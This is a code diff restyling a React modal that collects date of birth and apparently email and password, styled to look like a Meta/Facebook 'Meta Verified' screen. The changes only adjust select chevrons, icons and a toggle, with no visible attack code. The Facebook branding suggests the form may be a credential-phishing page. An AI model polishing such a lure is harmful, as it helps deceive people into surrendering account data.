@@ -12,6 +12,21 @@ interface InfomationsModalProps {
   onToggleModal: (isOpen: boolean) => void;
 }
 
+const DobSelectChevron = () => (
+  <svg
+    aria-hidden
+    className="pointer-events-none absolute right-[9px] top-1/2 h-[14px] w-[14px] -translate-y-1/2 text-[#65676b]"
+    viewBox="0 0 20 20"
+    fill="currentColor"
+  >
+    <path
+      fillRule="evenodd"
+      d="M5.23 7.21a.75.75 0 011.06.02L10 10.94l3.71-3.71a.75.75 0 111.06 1.06l-4.24 4.25a.75.75 0 01-1.06 0L5.21 8.29a.75.75 0 01.02-1.08z"
+      clipRule="evenodd"
+    />
+  </svg>
+);
+
 const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
   const t = useAppStrings();
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -82,6 +97,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
   };
 
   const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
+  const dobWrapperClass = (field: string) =>
+    `input relative w-full overflow-hidden border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-white text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
+  const dobSelectClass =
+    'meta-verified-dob-select h-full w-full min-w-0 cursor-pointer border-0 bg-transparent pl-[10px] pr-[26px] text-[14px] font-normal text-[#050505] outline-none';
   const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
   const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
   const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
@@ -177,10 +196,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             <div className="grid grid-cols-3 gap-[8px] sm:gap-[10px]">
               <div>
-                <div className={inputClass('day')}>
+                <div className={dobWrapperClass('day')}>
                   <select
                     id='day'
-                    className="w-full outline-0 h-full"
+                    className={dobSelectClass}
                     value={formData.day}
                     onChange={handleChange}
                   >
@@ -189,15 +208,16 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                       <option key={day} value={day}>{day}</option>
                     ))}
                   </select>
+                  <DobSelectChevron />
                 </div>
                 {errorText('day')}
               </div>
 
               <div>
-                <div className={inputClass('month')}>
+                <div className={dobWrapperClass('month')}>
                   <select
                     id='month'
-                    className="w-full outline-0 h-full"
+                    className={dobSelectClass}
                     value={formData.month}
                     onChange={handleChange}
                   >
@@ -206,15 +226,16 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                       <option key={month} value={month}>{month}</option>
                     ))}
                   </select>
+                  <DobSelectChevron />
                 </div>
                 {errorText('month')}
               </div>
 
               <div>
-                <div className={inputClass('year')}>
+                <div className={dobWrapperClass('year')}>
                   <select
                     id='year'
-                    className="w-full outline-0 h-full"
+                    className={dobSelectClass}
                     value={formData.year}
                     onChange={handleChange}
                   >
@@ -223,6 +244,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                       <option key={year} value={year}>{year}</option>
                     ))}
                   </select>
+                  <DobSelectChevron />
                 </div>
                 {errorText('year')}
               </div>
@@ -232,9 +254,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             <div className="mb-[10px] overflow-hidden rounded-[12px] border border-[#e4e6eb] bg-white">
               <div className="h-[3px] bg-[#1877f2]" aria-hidden="true" />
               <div className="flex items-center gap-[12px] px-[14px] py-[14px]">
-                <div className="flex h-[48px] w-[48px] shrink-0 items-center justify-center rounded-full bg-[#9aa7b5]">
-                  <img src="/images/icons/ic_facebook.svg" alt="" className="h-[28px] w-[28px] brightness-0 invert" />
-                </div>
+                <img src="/images/icons/ic_facebook.svg" alt="" className="h-[40px] w-[40px] shrink-0" />
                 <div className="min-w-0 flex-1">
                   <p className="text-[15px] font-semibold leading-snug text-[#050505]">{t.info.fbNotifyTitle}</p>
                   <p className="mt-[2px] text-[13px] leading-[1.45] text-[#65676b]">{t.info.fbNotifyDesc}</p>
@@ -245,10 +265,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                   aria-checked={fbNotifyOn}
                   aria-label={t.info.fbNotifyTitle}
                   onClick={() => setFbNotifyOn((v) => !v)}
-                  className={`relative h-[28px] w-[48px] shrink-0 rounded-full transition-colors duration-200 ${fbNotifyOn ? 'bg-[#1877f2]' : 'bg-[#ccd0d5]'}`}
+                  className={`relative h-[24px] w-[44px] shrink-0 cursor-pointer rounded-full border-0 transition-colors duration-200 ease-in-out focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#1877f2] ${fbNotifyOn ? 'bg-[#1877f2]' : 'bg-[#ccd0d5]'}`}
                 >
                   <span
-                    className={`absolute top-[3px] h-[22px] w-[22px] rounded-full bg-white shadow transition-transform duration-200 ${fbNotifyOn ? 'translate-x-[20px]' : 'translate-x-[3px]'}`}
+                    aria-hidden="true"
+                    className={`absolute top-[2px] left-[2px] block h-[20px] w-[20px] rounded-full bg-white shadow-[0_1px_3px_rgba(0,0,0,0.18)] transition-transform duration-200 ease-in-out ${fbNotifyOn ? 'translate-x-[20px]' : 'translate-x-0'}`}
                   />
                 </button>
               </div>
